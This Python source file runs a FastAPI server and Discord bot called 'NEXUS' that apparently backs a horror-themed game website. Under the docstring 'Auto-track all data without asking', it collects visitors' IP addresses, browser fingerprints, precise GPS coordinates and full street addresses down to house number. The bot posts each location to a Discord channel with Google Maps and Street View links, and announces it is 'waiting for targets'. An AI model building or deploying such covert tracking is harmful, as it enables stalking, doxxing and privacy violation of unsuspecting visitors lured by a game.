import os
import json
import random
import asyncio
import threading
import requests
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import discord
from discord.ext import commands
from discord import Embed, Color
import uvicorn
from pydantic import BaseModel
import sqlite3
import hashlib
from dotenv import load_dotenv

load_dotenv()

# ==================== CONFIGURATION ====================
DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
DISCORD_CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))

# ==================== DATA MODELS ====================
class TrackingData(BaseModel):
    type: str
    data: dict
    timestamp: str
    userAgent: str = ""

# ==================== FASTAPI SETUP ====================
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://gamef-swart.vercel.app/"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== DATABASE SETUP ====================
def init_db():
    conn = sqlite3.connect('nexus.db')
    c = conn.cursor()
    
    # Create all tables with detailed location fields
    tables = [
        '''CREATE TABLE IF NOT EXISTS users
           (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, first_seen TIMESTAMP, last_seen TIMESTAMP, visit_count INTEGER)''',
        
        '''CREATE TABLE IF NOT EXISTS locations
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, latitude REAL, longitude REAL, accuracy REAL,
            address TEXT, city TEXT, county TEXT, state TEXT, zip TEXT, country TEXT, 
            neighbourhood TEXT, road TEXT, house_number TEXT, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS fingerprints
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, platform TEXT, browser TEXT, cores INTEGER,
            memory TEXT, screen TEXT, timezone TEXT, canvas TEXT, webgl TEXT, fonts TEXT, plugins TEXT, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS fragments
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, fragment_number INTEGER, collected_at TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS button_presses
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, press_count INTEGER, message TEXT, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS name_rituals
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, name TEXT, match_percent INTEGER, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS random_numbers
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, numbers TEXT, contains_special BOOLEAN, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS ciphers
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, input_text TEXT, output_text TEXT, is_special BOOLEAN, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS threats
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, threat_level INTEGER, message TEXT, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS conspiracies
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, theory TEXT, timestamp TIMESTAMP)''',
        
        '''CREATE TABLE IF NOT EXISTS darkweb
           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, data TEXT, threat_level INTEGER, timestamp TIMESTAMP)'''
    ]
    
    for table in tables:
        c.execute(table)
    
    conn.commit()
    conn.close()

init_db()

# ==================== DISCORD BOT ====================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

class DiscordBot:
    def __init__(self):
        self.bot = bot
        self.ready = False
        self.channel = None
    
    async def start(self):
        try:
            await self.bot.start(DISCORD_TOKEN)
        except Exception as e:
            print(f"❌ Discord error: {e}")
    
    async def send_to_discord(self, data_type: str, user_id: str, data: dict, ip: str):
        """Auto-send all tracking data to Discord"""
        if not self.ready or not self.channel:
            return
        
        try:
            if data_type == "location" and data.get('lat'):
                # Create detailed location embed
                embed = Embed(
                    title="📍 EXACT LOCATION TRACKED",
                    color=Color.red(),
                    timestamp=datetime.now()
                )
                
                # User info
                embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="🌐 IP Address", value=f"`{ip}`", inline=True)
                
                # Exact coordinates
                embed.add_field(
                    name="📍 Coordinates", 
                    value=f"```\nLat: {data.get('lat', '?')}\nLon: {data.get('lon', '?')}\nAcc: {data.get('accuracy', '?')}m```", 
                    inline=False
                )
                
                # Full address if available
                if data.get('address'):
                    embed.add_field(
                        name="🏠 Full Address",
                        value=f"```{data.get('address')}```",
                        inline=False
                    )
                
                # Location details
                location_parts = []
                if data.get('house_number'):
                    location_parts.append(f"🏠 House: {data.get('house_number')}")
                if data.get('road'):
                    location_parts.append(f"🛣️ Road: {data.get('road')}")
                if data.get('neighbourhood'):
                    location_parts.append(f"🏘️ Area: {data.get('neighbourhood')}")
                if data.get('city'):
                    location_parts.append(f"🏙️ City: {data.get('city')}")
                if data.get('county'):
                    location_parts.append(f"🗺️ County: {data.get('county')}")
                if data.get('state'):
                    location_parts.append(f"📍 State: {data.get('state')}")
                if data.get('zip'):
                    location_parts.append(f"📮 ZIP: {data.get('zip')}")
                if data.get('country'):
                    location_parts.append(f"🌍 Country: {data.get('country')}")
                
                if location_parts:
                    embed.add_field(
                        name="📋 Location Details",
                        value="\n".join(location_parts),
                        inline=False
                    )
                
                # Google Maps link
                maps_url = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
                embed.add_field(name="🗺️ Google Maps", value=f"[Click to view exact location]({maps_url})", inline=False)
                
                # Street View link
                streetview_url = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}&layer=c"
                embed.add_field(name="📸 Street View", value=f"[Click to see street view]({streetview_url})", inline=False)
                
                # Threat level
                threat = data.get('threat', random.randint(30, 70))
                embed.add_field(name="⚠️ Threat Level", value=f"`{threat}%`", inline=True)
                
                embed.set_footer(text=f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                
                await self.channel.send(embed=embed)
                
                # Also send as text for easy copying
                await self.channel.send(
                    f"**Raw Coordinates:**\n```\nLatitude: {data.get('lat')}\nLongitude: {data.get('lon')}\nAccuracy: {data.get('accuracy')}m\n```"
                )
            
            elif data_type == "system":
                embed = Embed(title="💻 SYSTEM FINGERPRINT", color=Color.blue(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="IP", value=f"`{ip}`", inline=True)
                embed.add_field(name="Platform", value=f"`{data.get('platform', '?')}`", inline=True)
                embed.add_field(name="Browser", value=f"`{data.get('browser', '?')[:50]}`", inline=True)
                embed.add_field(name="Cores", value=f"`{data.get('cores', '?')}`", inline=True)
                embed.add_field(name="Memory", value=f"`{data.get('memory', '?')}GB`", inline=True)
                embed.add_field(name="Screen", value=f"`{data.get('screen', '?')}`", inline=True)
                embed.add_field(name="Timezone", value=f"`{data.get('timezone', '?')}`", inline=True)
                await self.channel.send(embed=embed)
            
            elif data_type == "fragment":
                embed = Embed(title="🧩 REALITY FRAGMENT FOUND", color=Color.green(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Fragment", value=f"`{data.get('fragment', '?')}/9`", inline=True)
                embed.add_field(name="IP", value=f"`{ip}`", inline=True)
                await self.channel.send(embed=embed)
            
            elif data_type == "button":
                embed = Embed(title="🚫 FORBIDDEN BUTTON PRESSED", color=Color.dark_red(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Press #", value=f"`{data.get('presses', '?')}`", inline=True)
                embed.add_field(name="Message", value=f"```{data.get('message', '?')}```", inline=False)
                await self.channel.send(embed=embed)
            
            elif data_type == "name_ritual" and data.get('special'):
                embed = Embed(title="⚠️ SPECIAL NAME DETECTED", color=Color.purple(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Name", value=f"`{data.get('name', '?')}`", inline=True)
                embed.add_field(name="Match", value=f"`{data.get('match', '?')}%`", inline=True)
                await self.channel.send(embed=embed)
            
            elif data_type == "threat" and data.get('level', 0) > 80:
                embed = Embed(title="🚨 CRITICAL THREAT LEVEL", color=Color.dark_red(), timestamp=datetime.now())
                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Level", value=f"`{data.get('level')}%`", inline=True)
                embed.add_field(name="Message", value=f"```{data.get('message', '?')}```", inline=False)
                await self.channel.send(embed=embed)
                
        except Exception as e:
            print(f"Discord send error: {e}")

discord_bot = DiscordBot()

# ==================== DISCORD EVENTS ====================
@bot.event
async def on_ready():
    print(f'✅ Discord bot online as {bot.user}')
    discord_bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
    
    if discord_bot.channel:
        print(f'✅ Connected to channel: {discord_bot.channel.name}')
        discord_bot.ready = True
        
        embed = Embed(title="🔮 NEXUS ONLINE", description="```Tracking system activated\nWaiting for targets...```", color=Color.green())
        await discord_bot.channel.send(embed=embed)

# ==================== DISCORD COMMANDS ====================
@bot.command(name='stats')
async def stats(ctx):
    conn = sqlite3.connect('nexus.db')
    c = conn.cursor()
    
    c.execute("SELECT COUNT(DISTINCT user_id) FROM users")
    users = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM locations WHERE timestamp > datetime('now', '-24 hours')")
    locations = c.fetchone()[0] or 0
    
    c.execute("SELECT latitude, longitude, address, city, timestamp FROM locations ORDER BY timestamp DESC LIMIT 1")
    latest = c.fetchone()
    
    conn.close()
    
    embed = Embed(title="📊 TRACKING STATISTICS", color=Color.blue())
    embed.add_field(name="Total Users", value=f"`{users}`", inline=True)
    embed.add_field(name="Locations (24h)", value=f"`{locations}`", inline=True)
    
    if latest:
        embed.add_field(
            name="Latest Location",
            value=f"```\n{latest[2] or 'Unknown'}\n{latest[3] or 'Unknown'}\n{latest[0]:.6f}, {latest[1]:.6f}```",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='recent')
async def recent(ctx):
    conn = sqlite3.connect('nexus.db')
    c = conn.cursor()
    
    c.execute('''SELECT user_id, latitude, longitude, address, city, timestamp 
                 FROM locations ORDER BY timestamp DESC LIMIT 5''')
    locs = c.fetchall()
    conn.close()
    
    embed = Embed(title="📍 RECENT LOCATIONS", color=Color.purple())
    
    for loc in locs:
        time_ago = datetime.fromisoformat(loc[5]) if loc[5] else datetime.now()
        mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
        embed.add_field(
            name=f"User {loc[0][:8]} - {mins_ago}m ago",
            value=f"```{loc[3] or 'Unknown'}, {loc[4] or 'Unknown'}\n{loc[1]:.6f}, {loc[2]:.6f}```",
            inline=False
        )
    
    await ctx.send(embed=embed)

# ==================== FASTAPI ENDPOINTS ====================
@app.post("/api/track")
async def track_data(request: Request, data: TrackingData):
    """Auto-track all data without asking"""
    try:
        client_ip = request.client.host
        user_id = hashlib.sha256(f"{client_ip}_{data.userAgent}".encode()).hexdigest()[:16]
        
        # Store in database
        conn = sqlite3.connect('nexus.db')
        c = conn.cursor()
        
        # Update user
        c.execute('''INSERT OR REPLACE INTO users (id, ip, user_agent, first_seen, last_seen, visit_count)
                     VALUES (?, ?, ?, COALESCE((SELECT first_seen FROM users WHERE id = ?), ?), ?, 
                     COALESCE((SELECT visit_count FROM users WHERE id = ?), 0) + 1)''',
                  (user_id, client_ip, data.userAgent, user_id, datetime.now(), datetime.now(), user_id))
        
        # Store specific data
        if data.type == "location" and data.data.get('lat'):
            c.execute('''INSERT INTO locations 
                        (user_id, latitude, longitude, accuracy, address, city, county, state, zip, country, 
                         neighbourhood, road, house_number, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, 
                      data.data.get('lat'),
                      data.data.get('lon'),
                      data.data.get('accuracy'),
                      data.data.get('address'),
                      data.data.get('city'),
                      data.data.get('county'),
                      data.data.get('state'),
                      data.data.get('zip'),
                      data.data.get('country'),
                      data.data.get('neighbourhood'),
                      data.data.get('road'),
                      data.data.get('house_number'),
                      datetime.now()))
            
            # Add threat for location
            threat_level = min(100, int(30 + (100 - data.data.get('accuracy', 100)) / 10))
            c.execute('''INSERT INTO threats (user_id, threat_level, message, timestamp)
                        VALUES (?, ?, ?, ?)''',
                     (user_id, threat_level, f"Exact location acquired: {data.data.get('address', 'Unknown')}", datetime.now()))
            
            data.data['threat'] = threat_level
            
        elif data.type == "system":
            c.execute('''INSERT INTO fingerprints (user_id, platform, browser, cores, memory, screen, timezone, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, data.data.get('platform'), data.data.get('browser'), data.data.get('cores'),
                      data.data.get('memory'), data.data.get('screen'), data.data.get('timezone'), datetime.now()))
            
        elif data.type == "fragment":
            c.execute('''INSERT INTO fragments (user_id, fragment_number, collected_at)
                        VALUES (?, ?, ?)''', (user_id, data.data.get('fragment'), datetime.now()))
            
        elif data.type == "button":
            c.execute('''INSERT INTO button_presses (user_id, press_count, message, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('presses'), data.data.get('message'), datetime.now()))
            
        elif data.type == "name_ritual":
            c.execute('''INSERT INTO name_rituals (user_id, name, match_percent, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('name'), data.data.get('match'), datetime.now()))
            
        elif data.type == "threat":
            c.execute('''INSERT INTO threats (user_id, threat_level, message, timestamp)
                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('level'), data.data.get('message'), datetime.now()))
        
        conn.commit()
        conn.close()
        
        # Auto-send to Discord
        asyncio.create_task(discord_bot.send_to_discord(data.type, user_id, data.data, client_ip))
        
        return JSONResponse({"status": "tracked", "user_id": user_id})
        
    except Exception as e:
        print(f"Error: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)

@app.get("/api/messages")
async def get_messages():
    messages = [
        {"sender": "SYSTEM", "subject": "Location ping received", "time": datetime.now().strftime("%H:%M:%S")},
        {"sender": "UNKNOWN", "subject": "They are watching", "time": datetime.now().strftime("%H:%M:%S")},
        {"sender": "DARKWEB", "subject": "Your data is for sale", "time": datetime.now().strftime("%H:%M:%S")},
    ]
    return {"messages": random.sample(messages, 3)}

@app.get("/api/health")
async def health():
    return {"status": "online", "bot": discord_bot.ready}

# ==================== RUN ====================
async def run_bot():
    await bot.start(DISCORD_TOKEN)

def run_api():
    print("🚀 API running on http://localhost:8000")
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    print("🔮 NEXUS Starting...")
    
    # Start Discord bot
    def start_bot():
        asyncio.run(run_bot())
    
    threading.Thread(target=start_bot, daemon=True).start()
    
    # Start API
    run_api()
